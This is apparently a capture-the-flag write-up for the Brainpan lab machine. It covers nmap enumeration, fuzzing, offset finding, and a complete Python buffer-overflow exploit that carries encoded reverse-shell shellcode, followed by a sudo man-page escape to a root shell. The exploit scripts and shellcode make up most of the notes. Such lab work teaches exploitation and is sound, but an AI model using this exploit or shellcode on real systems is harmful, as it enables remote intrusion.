# Ennumeration 
##Nmap 
```
nmap -sC -sV 10.10.140.181
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-22 19:35 EST
Nmap scan report for 10.10.140.181
Host is up (0.12s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
                                                                            
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 76.65 seconds  
```
## Port 10000 open
* gobuster found /bin
* Downloaded brainpan.exe
## Port 9999 
* the brainpan port to eventully grant shell?

# Brainpan.exe 
* launched the exe and attached with immunity
* Running on port 9999 as well
##Fuzzing.py
```
import sys, socket 
from time import sleeo

buffer = "A" * 100

while True:
    try:
        payload = buffer + '\r\n'
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.0.158',9999))
        print("[+] Sending payload....\n" + str(len(buffer)))
        s.send((payload.encode()))
        s.close()
        sleep(1)
        buffer = buffer + "A" * 100
    except:
        print("The fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()
```
* Output shows that it crashed at about 1000 bytes
* Immunity shows the program crashed and the EIP was overwritten with 41414141, 4 A's
* ##BufferFuzzing.py
```
import sys, socket 

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

print("Sending Payload")
payload = buffer + '\r\n'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.0.158',9999))
print("[+] Sending payload....\n" + str(len(buffer)))
s.send((payload.encode()))
s.close()
```
* EIP value now 35724134
* Offset found via:
	* msf-pattern_offset -l 1000 -q 35724134
		[*] Exact match at offset 524  
* ``` buffer = "A" * 524 + "B" * 4 ```
* Sets the EIP to all B's
## Bad chars 
* https://github.com/mrinalpande/scripts/blob/master/python/badchars
* Click the ESP and hit follow in dump 
* Look for 01 to FF and look for any bad characters, there are none this time 
## Mona
* mona find -s "\xff\xe4" -m brainpan.exe
* Found 1 pointer at 311712F3
* Register: 311712F3   . FFE4           JMP ESP
## Hitting breakpoint 
```
import sys, socket 

buffer = b"A" * 524 + b"\xf3\x12\x17\x31"

print("Sending Payload")
payload = buffer + b'\r\n'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.0.158',9999))
print("[+] Sending payload....\n" + str(len(buffer)))
s.send(payload)
s.close()
```

## Getting the reverse shell 
```
import sys, socket 

buffer = b"A" * 524 + b"\xf3\x12\x17\x31" + b"\x90" * 32

payload2 = (b"\xb8\x3c\xd8\x7a\xc6\xdb\xc8\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
b"\x52\x83\xea\xfc\x31\x42\x0e\x03\x7e\xd6\x98\x33\x82\x0e\xde"
b"\xbc\x7a\xcf\xbf\x35\x9f\xfe\xff\x22\xd4\x51\x30\x20\xb8\x5d"
b"\xbb\x64\x28\xd5\xc9\xa0\x5f\x5e\x67\x97\x6e\x5f\xd4\xeb\xf1"
b"\xe3\x27\x38\xd1\xda\xe7\x4d\x10\x1a\x15\xbf\x40\xf3\x51\x12"
b"\x74\x70\x2f\xaf\xff\xca\xa1\xb7\x1c\x9a\xc0\x96\xb3\x90\x9a"
b"\x38\x32\x74\x97\x70\x2c\x99\x92\xcb\xc7\x69\x68\xca\x01\xa0"
b"\x91\x61\x6c\x0c\x60\x7b\xa9\xab\x9b\x0e\xc3\xcf\x26\x09\x10"
b"\xad\xfc\x9c\x82\x15\x76\x06\x6e\xa7\x5b\xd1\xe5\xab\x10\x95"
b"\xa1\xaf\xa7\x7a\xda\xd4\x2c\x7d\x0c\x5d\x76\x5a\x88\x05\x2c"
b"\xc3\x89\xe3\x83\xfc\xc9\x4b\x7b\x59\x82\x66\x68\xd0\xc9\xee"
b"\x5d\xd9\xf1\xee\xc9\x6a\x82\xdc\x56\xc1\x0c\x6d\x1e\xcf\xcb"
b"\x92\x35\xb7\x43\x6d\xb6\xc8\x4a\xaa\xe2\x98\xe4\x1b\x8b\x72"
b"\xf4\xa4\x5e\xd4\xa4\x0a\x31\x95\x14\xeb\xe1\x7d\x7e\xe4\xde"
b"\x9e\x81\x2e\x77\x34\x78\xb9\xd4\xd2\xbe\xba\x4d\xe7\xbe\xa2"
b"\xec\x6e\x58\xb0\xfe\x26\xf3\x2d\x66\x63\x8f\xcc\x67\xb9\xea"
b"\xcf\xec\x4e\x0b\x81\x04\x3a\x1f\x76\xe5\x71\x7d\xd1\xfa\xaf"
b"\xe9\xbd\x69\x34\xe9\xc8\x91\xe3\xbe\x9d\x64\xfa\x2a\x30\xde"
b"\x54\x48\xc9\x86\x9f\xc8\x16\x7b\x21\xd1\xdb\xc7\x05\xc1\x25"
b"\xc7\x01\xb5\xf9\x9e\xdf\x63\xbc\x48\xae\xdd\x16\x26\x78\x89"
b"\xef\x04\xbb\xcf\xef\x40\x4d\x2f\x41\x3d\x08\x50\x6e\xa9\x9c"
b"\x29\x92\x49\x62\xe0\x16\x79\x29\xa8\x3f\x12\xf4\x39\x02\x7f"
b"\x07\x94\x41\x86\x84\x1c\x3a\x7d\x94\x55\x3f\x39\x12\x86\x4d"
b"\x52\xf7\xa8\xe2\x53\xd2")

print("Sending Payload")
payload = buffer + payload2 + b'\r\n'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.0.158',9999))
print("[+] Sending payload....\n" + str(len(buffer)))
s.send(payload)
s.close()
```

* Boom, reverse shell now works 
* Returns the puck user on the Z drive which is weird 
* Theres a linux file system on the box 
* Use msfvenom to remake the shell code but for linux this time
* Returns bash
## Priv Es
* given this weird binary
	* /home/anansi/bin/anansi_util
* Trying each of the commands you can tell that manual outputs the manual page for whatever command you enter 
* if you run sudo /home/anansi/bin/anansi_util manual ls you'll get the man page for ls 
* Typing !/bin/bash returns a root shell 
